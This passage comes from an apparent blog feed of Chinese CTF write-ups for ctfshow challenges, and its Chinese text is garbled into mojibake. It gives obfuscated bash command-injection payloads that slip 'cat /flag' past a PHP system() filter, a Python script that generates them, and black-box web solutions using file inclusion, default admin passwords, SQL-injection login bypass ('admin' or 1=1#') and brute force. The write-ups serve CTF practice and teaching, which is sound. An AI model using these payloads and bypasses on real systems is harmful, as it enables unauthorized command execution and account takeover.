alt="image-20230220165407967"></p><p>è¿™é‡Œçš„è¯æ¯”ä¸Šä¸€é¢˜å°‘äº†ä¸ªé›¶ï¼Œä½†æ˜¯ç”¨ä¸Šä¸€é¢˜çš„è§£æ³•çš„è¯ï¼Œå¯ä»¥ç›´æ¥é€šæ€ã€‚</p><p><strong>payload</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctf_show=$0&lt;&lt;&lt;$0\&lt;\&lt;\&lt;$\&#x27;\\$((~$(($((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))))))\\$((~$(($((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))))))\\$((~$(($((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))\\$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))$((~$(($((~$(())))))))\\$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))\\$((~$(($((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))\\$((~$(($((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))\\$((~$(($((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))))))\\$((~$(($((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))\&#x27;</span><br></pre></td></tr></table></figure><p><strong>å®˜æ–¹wp</strong></p><p>å°±æ˜¯æƒ³åŠæ³•æ¥æ„é€ 1</p><p><img src="../images/image-20230220165528116.png" alt="image-20230220165528116"></p><p><code>#</code>æ˜¯è®¡ç®—å­—ç¬¦ä¸²é•¿åº¦ï¼Œä¸¤ä¸ª<code>#</code>ä¸­ï¼Œç¬¬ä¸€ä¸ª#æ˜¯è®¡ç®—å­—ç¬¦ä¸²é•¿åº¦ ç¬¬äºŒä¸ª#æ˜¯å­—ç¬¦ä¸²çš„åå­—ã€‚$#çš„å€¼æ˜¯0ï¼Œå­—ç¬¦ä¸²é•¿åº¦ä¸º1ï¼Œæ‰€ä»¥<code>$</code>æ˜¯1</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">è¿™é‡Œ\$$&#123;#&#125;ï¼Œè™½ç„¶è¾“å‡ºæ˜¯$0,ä½†æ˜¯å¹¶ä¸æŒ‰$0æ¥è§£æ</span><br></pre></td></tr></table></figure><p>è¿˜æ˜¯æ„é€  <strong>cat /flag</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctf_show=$0&lt;&lt;&lt;$0\&lt;\&lt;\&lt;\$\&#x27;\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;000$&#123;##&#125;$&#123;##&#125;$&#123;##&#125;$&#123;##&#125;))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;000$&#123;##&#125;$&#123;##&#125;0$&#123;##&#125;))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;0$&#123;##&#125;00$&#123;##&#125;00))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;0$&#123;##&#125;000))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$&#123;##&#125;$&#123;##&#125;00$&#123;##&#125;))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;00$&#123;##&#125;00$&#123;##&#125;0))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;00$&#123;##&#125;$&#123;##&#125;0$&#123;##&#125;0))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;000$&#123;##&#125;$&#123;##&#125;0$&#123;##&#125;))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;00$&#123;##&#125;00$&#123;##&#125;$&#123;##&#125;))\&#x27;</span><br></pre></td></tr></table></figure><p>å°±æ˜¯æŠŠ1æ›¿æ¢æˆ$å°±è¡Œäº†</p><h2 id="æé™å‘½ä»¤æ‰§è¡Œ5"><a href="#æé™å‘½ä»¤æ‰§è¡Œ5" class="headerlink" title="æé™å‘½ä»¤æ‰§è¡Œ5"></a>æé™å‘½ä»¤æ‰§è¡Œ5</h2><p>é¢˜ç›®</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//æœ¬é¢˜çµæ„Ÿæ¥è‡ªç ”ç©¶ä¸€ç›´æ²¡åšå‡ºæ¥çš„æŸèµ›æŸé¢˜æ—¶æƒ³åˆ°çš„å§¿åŠ¿ï¼Œå¤ªæ£’å•¦~ã€‚</span></span><br><span class="line"><span class="comment">//flagåœ¨æ ¹ç›®å½•flagé‡Œ</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;check.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ctf_show&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$ctfshow</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;ctf_show&#x27;</span>];</span><br><span class="line">    <span class="title function_ invoke__">check</span>(<span class="variable">$ctfshow</span>);</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="variable">$ctfshow</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>è¿˜æ˜¯å…ˆè·‘ä¸€ä¸‹pyè„šæœ¬ï¼Œçœ‹å“ªäº›å‚æ•°å¯ä»¥è¿›è¡Œåˆ©ç”¨</p><p><img src="../images/image-20230220172921706.png" alt="image-20230220172921706"></p><p>01éƒ½å¾—äº†ï¼Œè¿™é‡Œçš„è¯æˆ‘ä»¬å¯ä»¥é€šè¿‡~$()æ¥æ„é€ æ•°å­—ï¼Œä½†æ˜¯0ï¼Œæ²¡äº†æˆ‘ä»¬å°±å¾—æƒ³å…«æ³•æ¥æ„é€ $0æ¥æ„é€ bashäº†ã€‚</p><p>1ã€æ˜¯<code>$&#123;!xxx&#125;</code>çš„ç”¨æ³•ï¼Œä¸¾ä¸€ä¸ªå¾ˆç®€å•çš„ä¾‹å­ï¼š</p><p><img src="../images/image-20230220173724959.png" alt="image-20230220173724959"></p><p>æ‰€ä»¥å…¶å®åœ¨è¿™é‡Œï¼Œåªè¦æƒ³åŠæ³•æ„é€ ä¸€ä¸ªå˜é‡ï¼Œå˜é‡å€¼æ˜¯0ï¼Œå°±å¯ä»¥å¾ˆå®¹æ˜“çš„æ‹¿åˆ°<code>$0</code>äº†</p><p>å…¶å®åœ¨å‡ºé¢˜è¿‡ç¨‹ä¸­ï¼Œä½¿ç”¨å‘½ä»¤è¡Œè¿›è¡Œæµ‹è¯•ï¼Œå¯ä»¥é€šè¿‡<code>$&#123;!?&#125;</code>å’Œ<code>$&#123;!#&#125;</code>çš„å½¢å¼æ‹¿åˆ°<code>bash</code></p><p>ä½†æ˜¯å¾ˆå¯æƒœï¼Œåœ¨phpçš„systemç¯å¢ƒä¸‹æ²¡æœ‰å®ç°ï¼Œä¸ç„¶å¯ä»¥åšåˆ°æ›´æé™</p><p><img src="../images/image-20230220173758701.png" alt="image-20230220173758701"></p><p>æ‰€ä»¥ä»…èƒ½é€šè¿‡å®šä¹‰ä¸€ä¸ª<code>__=$(())</code>çš„æ–¹å¼å°†<code>__</code>å˜é‡çš„å€¼è®¾ç½®ä¸º0ï¼Œç„¶åé€šè¿‡<code>$&#123;!__&#125;</code>çš„å½¢å¼æ‹¿åˆ°<code>sh</code>å­—ç¬¦ã€‚ä¸¤æ¡å‘½ä»¤é—´é€šè¿‡<code>&amp;&amp;</code>è¿›è¡Œè¿æ¥ã€‚è‡³äºä¸ºä»€ä¹ˆæ˜¯ä¸¤ä¸ªä¸‹åˆ’çº¿ï¼Œæ˜¯å› ä¸ºbashçš„å˜é‡å‘½åè§„èŒƒæ˜¯ä»¥ä¸‹åˆ’çº¿æˆ–è€…è‹±æ–‡å­—æ¯å¼€å¤´ï¼Œå¯ä»¥åŒ…å«ä¸‹åˆ’çº¿å’Œè‹±æ–‡å­—æ¯æ•°å­—ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$0å’Œ$&#123;0&#125;è¾“å‡ºçš„æ˜¯ä¸€ä¸ªæ„æ€</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230220174141641.png" alt="image-20230220174141641"></p><p><img src="../images/image-20230220173839677.png" alt="image-20230220173839677"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">è¿™é‡Œä¸ç”¨<span class="variable">$_</span>çš„æ„æ€æ˜¯å› ä¸º<span class="variable">$_</span>æœ‰è‡ªå·±çš„æ„æ€ï¼Œå°±æ˜¯è®°å½•ä¸Šä¸€æ¬¡çš„å€¼</span><br></pre></td></tr></table></figure><p>2ã€æ˜¯<code>~</code>æ“ä½œï¼Œ<code>#</code>è¢«ç¦ç”¨ï¼Œ<code>~</code>æ˜¯æŒ‰ä½å–åæ“ä½œï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡<code>$(())</code>å–åˆ°0ï¼Œç„¶åå¯¹0è¿›è¡ŒæŒ‰ä½å–åï¼Œå¯ä»¥å¾—åˆ°-1ï¼Œå¾ˆå¤šä¸ª-1è¿›è¡Œæ’åˆ— å¯ä»¥å¾—åˆ°-2ã€-3ã€-4ã€-5ã€-6ã€-7ã€-8ï¼Œç„¶åå†æŒ‰ä½å–åå°±å¯ä»¥å¾—åˆ°1ã€2ã€3ã€4ã€5ã€6ã€7ã€‚ï¼ˆè¿™ä¸ªæ“ä½œæ˜¯webå…¥é—¨57çš„å§¿åŠ¿ï¼Œæœ‰å…´è¶£å¤§å®¶å¯ä»¥å»åšä¸€ä¸‹ï¼‰</p><p><img src="../images/-16768858935023.png" alt="img"></p><p><strong>pythonè„šæœ¬</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#a = r&quot;\ 5 7 \ 1 4 7 \ 1 4 5 \ 1 6 4 \ 1 4 6 \ 1 5 4 \ 1 4 1 \ 1 4 7&quot;</span></span><br><span class="line"></span><br><span class="line">a = <span class="string">r&quot;\ 1 4 3 \ 1 4 1 \ 1 6 4 \ 4 0 \ 5 7 \ 1 4 6 \ 1 5 4 \ 1 4 1 \ 1 4 7&quot;</span></span><br><span class="line"></span><br><span class="line">b = a.split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line"><span class="built_in">str</span> = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> b:</span><br><span class="line">    <span class="keyword">if</span> i != <span class="string">&quot;\\&quot;</span>:</span><br><span class="line">        <span class="built_in">str</span> += <span class="string">&quot;$((~$((&quot;</span> + <span class="string">&quot;$((~$(())))&quot;</span> * (<span class="built_in">int</span>(i) + <span class="number">1</span>) + <span class="string">&quot;))))&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">str</span> += <span class="string">&quot;\\\\&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;$\\&#x27;&quot;</span> + <span class="built_in">str</span> + <span class="string">&quot;\\&#x27;&quot;</span>)</span><br></pre></td></tr></table></figure><p>æœ€ç»ˆpayload</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctf_show=__=$(())%26%26$&#123;!__&#125;&lt;&lt;&lt;$&#123;!__&#125;\&lt;\&lt;\&lt;\$\&#x27;\\$((~$(($((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))))))\\$((~$(($((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))))))\\$((~$(($((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))\\$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))$((~$(($((~$(())))))))\\$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))\\$((~$(($((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))\\$((~$(($((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))\\$((~$(($((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))))))\\$((~$(($((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))\&#x27;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæœ‰ä¸€ä¸ªæ–°çŸ¥è¯†ï¼Œå¯ä»¥é€šæ€</p><p><img src="../images/image-20230220174830458.png" alt="image-20230220174830458"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="variable">$_</span>æœ‰è‡ªå·±çš„æ„æ€ï¼Œå°±æ˜¯è®°å½•ä¸Šä¸€æ¬¡çš„å€¼,æ‰€ä»¥åŠ ä¸€çš„è¯å°±ä¼šè¾“å‡ºaä¸‹ä¸€ä½çš„b</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">_=(<span class="string">&#x27;@&#x27;</span>^<span class="string">&#x27;!&#x27;</span>); //a</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">__=<span class="variable">$_</span>++; //b</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">___=++<span class="variable">$__</span>; //c</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">____=++<span class="variable">$___</span>; //d</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">_____=++<span class="variable">$____</span>; //e</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">______=++<span class="variable">$_____</span>; //f</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">_______=++<span class="variable">$______</span>; //g</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">________=++<span class="variable">$_______</span>; //h</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">_________=++<span class="variable">$________</span>; //i</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">__________=++<span class="variable">$_________</span>; //j</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">___________=++<span class="variable">$__________</span>; //k</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">____________=++<span class="variable">$___________</span>; //l</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">_____________=++<span class="variable">$____________</span>; //m</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">______________=++<span class="variable">$_____________</span>; //n</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">_______________=++<span class="variable">$______________</span>; //o</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">________________=++<span class="variable">$_______________</span>; //p</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">_________________=++<span class="variable">$________________</span>; //q</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">__________________=++<span class="variable">$_________________</span>; //r</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">___________________=++<span class="variable">$__________________</span>; //s</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">____________________=++<span class="variable">$___________________</span>; //t</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">_____________________=++<span class="variable">$____________________</span>; //u</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">______________________=++<span class="variable">$_____________________</span>; //v</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">_______________________=++<span class="variable">$______________________</span>; //w</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">________________________=++<span class="variable">$_______________________</span>; //x</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">_________________________=++<span class="variable">$________________________</span>; //y</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">__________________________=++<span class="variable">$_________________________</span>; //z</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> ctfshow æé™å‘½ä»¤æ‰§è¡Œji </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow-é»‘ç›’æµ‹è¯• åˆ·é¢˜è®°å½•</title>
      <link href="/posts/fed48c7b.html"/>
      <url>/posts/fed48c7b.html</url>
      
        <content type="html"><![CDATA[<p><a href="https://www.wangan.com/wenda/1860">ä»€ä¹ˆæ˜¯é»‘ç›’æµ‹è¯•</a></p><p>è¿™ä¸ªé»‘ç›’æµ‹è¯•å°±æ˜¯æˆ‘ä»¬ä¸çŸ¥é“æ˜¯å•¥è€ƒç‚¹ï¼Œå¾—è‡ªå·±å»æŒ–æ˜ï¼Œç„¶åæ‰¾åˆ°è¿™ä¸ªæ˜¯è€ƒå“ªä¸ªçŸ¥è¯†ç‚¹çš„</p><h2 id="web380-ç›®å½•æ‰«æ"><a href="#web380-ç›®å½•æ‰«æ" class="headerlink" title="web380(ç›®å½•æ‰«æ)"></a>web380(ç›®å½•æ‰«æ)</h2><p>é¢˜ç›®</p><p><img src="../images/image-20230202223826824.png" alt="image-20230202223826824"></p><p>å°±æ˜¯è¿™é‡Œçš„è¯ä¼šå‡ºç°<code>page_1.php</code>    <code>page_2.php</code>  <code>page_3.php</code></p><p>ç„¶åæˆ‘ä»¬å°±å¾—å°è¯•å»å‘ç°<code>page.php</code>  è¿™å°±æ˜¯ä¸€ç§æ€ç»´å‘æ•£ï¼Œæ¯•ç«Ÿåœ¨ç½‘ç«™ä¸Šæ²¡çœ‹åˆ°çš„è¯ï¼ŒæœåŠ¡å™¨ä¸Šä¸ä¸€å®šæ²¡æœ‰ã€‚   </p><p>éš¾ç‚¹å°±åœ¨è¿™é‡Œ</p><p><img src="../images/image-20230202224032610.png" alt="image-20230202224032610"></p><p>å‡ºç°ä¸ª$idï¼Œæˆ‘ä»¬å¯ä»¥å°è¯•ç»™idä¼ ä¸ªå€¼çœ‹çœ‹</p><p><img src="../images/image-20230202224117796.png" alt="image-20230202224117796"></p><p>å‘ç°æ˜¯ä¸ªæ–‡ä»¶åŒ…å«çš„é¢˜ç›®ï¼Œå¹¶ä¸”é™å®šäº†åç¼€ï¼Œæ‰€ä»¥æˆ‘ä»¬å°±å¾—å°è¯•å»æŸ¥çœ‹ä¸€ä¸‹<code>page.php</code>æºç </p><p><strong>page.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021-01-08 19:50:40</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2021-01-08 19:59:24</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#error_reporting(0);</span></span><br><span class="line"><span class="variable">$id</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$id</span>))&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;æ‰“å¼€$id.phpå¤±è´¥&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$html</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$id</span>.<span class="string">&#x27;.php&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$html</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç„¶åæˆ‘ä»¬å°±å»çŒœæ˜¯å¦å­˜åœ¨flag.php</p><p><img src="../images/image-20230202224440246.png" alt="image-20230202224440246"></p><p>æœ€åæ‹¿åˆ°flag.</p><h2 id="web381-cssè·¯å¾„"><a href="#web381-cssè·¯å¾„" class="headerlink" title="web381(cssè·¯å¾„)"></a>web381(cssè·¯å¾„)</h2><p>é¢˜ç›®</p><p><img src="../images/image-20230202224640173.png" alt="image-20230202224640173"></p><p>å’Œä¸Šä¸€é¢˜æ˜¯ä¸€æ ·çš„</p><p><img src="../images/image-20230202225033153.png" alt="image-20230202225033153"></p><p>æ‰“å¼€æºç å‘ç°æœ‰ä¸ªä¸ä¸€æ ·çš„åœ°æ–¹ï¼Œç„¶åè®¿é—®/alsckdfyå°±èƒ½æ‹¿åˆ°flagäº†ã€‚</p><p>è¿™é‡Œæ˜¯å› ä¸ºå‰ç«¯å’Œåç«¯å…±ç”¨ä¸€ä¸ªcssè·¯å¾„ï¼Œç„¶åå‰ç«¯å°±ä¼šæ³„éœ²å‡ºæ¥ï¼Œé‚£ä¹ˆåˆ«äººå°±ä¼šå°è¯•å»ç™»å½•çœ‹çœ‹ï¼Œå°±ä¼šå‘ç°äº†åå°åœ°å€ã€‚</p><h2 id="web382-ä¸‡èƒ½å¯†ç -çˆ†ç ´-sqlmap"><a href="#web382-ä¸‡èƒ½å¯†ç -çˆ†ç ´-sqlmap" class="headerlink" title="web382(ä¸‡èƒ½å¯†ç /çˆ†ç ´/sqlmap)"></a>web382(ä¸‡èƒ½å¯†ç /çˆ†ç ´/sqlmap)</h2><p>é¢˜ç›®</p><p><img src="../images/image-20230202225519773.png" alt="image-20230202225519773"></p><p>å› ä¸ºæˆ‘ä»¬åœ¨<strong>web381</strong>æ‹¿åˆ°äº†åå°ç®¡ç†å‘˜ç™»å½•åœ°å€ï¼Œæ‰€ä»¥æˆ‘ä»¬ç›´æ¥è®¿é—®</p><p><img src="../images/image-20230202225902255.png" alt="image-20230202225902255"></p><p>é‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥å°è¯•ä¸€ä¸‹é»˜è®¤å¯†ç ç™»å½•è¯•è¯•</p><p>admin/admin    admin/123   admin/admin888</p><p>é‚£ä¹ˆç»è¿‡å°è¯•çš„è¯ï¼Œå‘ç°æ˜¯<strong>admin/admin888</strong>æ˜¯åå°ç®¡ç†å‘˜å¯†ç </p><p>è¿™é‡Œç»™ä¸€ä¸ªå¼±å£ä»¤å¯†ç        <code>nE7jA%5m</code></p><p><img src="../images/image-20230202230438228.png" alt="image-20230202230438228"></p><p><strong>è§£æ³•äºŒ</strong></p><p>åå°ä¸‡èƒ½å¯†ç ç™»å½•</p><p><code>admin</code></p><p><code>admin&#39; or 1=1#</code></p><h2 id="web383-çˆ†ç ´-ä¸‡èƒ½å¯†ç "><a href="#web383-çˆ†ç ´-ä¸‡èƒ½å¯†ç " class="headerlink" title="web383(çˆ†ç ´/ä¸‡èƒ½å¯†ç )"></a>web383(çˆ†ç ´/ä¸‡èƒ½å¯†ç )</h2><p><img src="../images/image-20230202230734384.png" alt="image-20230202230734384"></p><p><strong>payload</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin<span class="operator">/</span>admin<span class="string">&#x27; or 1=1#    ---&gt;å†™åœ¨usernameæˆ–è€…passwordéƒ½è¡Œ</span></span><br></pre></td></tr></table></figure><h2 id="web384-çˆ†ç ´"><a href="#web384-çˆ†ç ´" class="headerlink" title="web384(çˆ†ç ´)"></a>web384(çˆ†ç ´)</h2><p>é¢˜ç›®</p><p><img src="../images/image-20230202231129790.png" alt="image-20230202231129790"></p><p><img src="../images/image-20230202231241003.png" alt="image-20230202231241003"></p><p>é¢˜ç›®è¿˜ç»™äº†æç¤ºï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±ç›´æ¥çˆ†ç ´å°±è¡Œäº†</p><p>å¯ä»¥å…ˆè‡ªå·±å†™ä¸€ä¸ªå¯†ç çš„ç”Ÿæˆå­—å…¸ï¼Œç„¶ååœ¨æ‹¿å»bpçˆ†ç ´</p><p>å¯†ç æ˜¯  <strong>xy123</strong></p><p>å¾—çˆ†ç ´  â€”-&gt;635000æ¬¡ï¼Œè¿˜æ˜¯ç»™æç¤ºçš„æƒ…å†µä¸‹ï¼Œä¸€èˆ¬æƒ…å†µä¸‹ï¼Œçˆ†ç ´ä¸€èˆ¬æ˜¯ä¸ç”¨çš„ï¼Œä¸åˆ°ä¸‡ä¸å¾—å·²æ—¶æœ€å¥½ä¸ç”¨ï¼Œå› ä¸ºæ—¶é—´å¤ªä¹…äº†</p><h2 id="web385-é…ç½®æ–‡ä»¶åˆ©ç”¨"><a href="#web385-é…ç½®æ–‡ä»¶åˆ©ç”¨" class="headerlink" title="web385(é…ç½®æ–‡ä»¶åˆ©ç”¨)"></a>web385(é…ç½®æ–‡ä»¶åˆ©ç”¨)</h2><p>é¢˜ç›®</p><p><img src="../images/image-20230202231836152.png" 